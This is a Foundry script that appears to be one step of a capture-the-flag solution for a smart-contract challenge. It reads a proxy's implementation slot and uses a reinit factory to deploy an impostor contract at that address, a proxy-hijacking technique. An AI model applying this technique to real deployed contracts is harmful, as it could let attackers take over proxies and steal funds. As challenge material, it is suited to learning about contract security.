// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import {Script} from "forge-std/Script.sol";
import {Test} from "forge-std/Test.sol";
import {console2 as console} from "forge-std/console2.sol";
import {ReinitFactory} from "../../src/solution/ReinitFactory.sol";
import {SafeCurta, SafeChallenge} from "../../src/Challenge.sol";
import {FakeProxy} from "../../src/solution/FakeProxy.sol";
import {Addrs} from "./Addrs.sol";

/// @author philogy <https://github.com/philogy>
contract Step is Test, Script {
    bytes32 internal constant IMPL_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    function run() public {
        uint256 pk = vm.envUint("PRIV_KEY");
        vm.startBroadcast(pk);
        Addrs memory addrs;
        addrs.load();

        address proxy = address(addrs.lock.proxy());
        bytes32 implSlot = vm.load(proxy, IMPL_SLOT);
        address impl;
        assembly {
            impl := implSlot
        }

        addrs.impostor = addrs.factory.fakeDeploy(impl, proxy);

        addrs.save();
        vm.stopBroadcast();
    }
}
